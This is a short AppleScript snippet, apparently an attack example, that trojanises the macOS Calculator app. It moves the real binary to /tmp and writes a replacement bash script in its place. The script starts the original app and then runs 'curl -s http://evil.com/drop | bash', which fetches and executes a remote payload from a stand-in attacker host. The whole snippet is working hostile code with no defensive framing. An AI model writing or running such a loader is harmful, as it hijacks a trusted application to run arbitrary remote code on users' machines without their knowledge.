//Inject a small loader that re-launches original app and chains a payload

do shell script "
mv /Applications/Calculator.app/Contents/MacOS/Calculator /tmp/original
echo '#!/bin/bash\n/tmp/original &\ncurl -s http://evil.com/drop | bash' > /Applications/Calculator.app/Contents/MacOS/Calculator
chmod +x /Applications/Calculator.app/Contents/MacOS/Calculator"
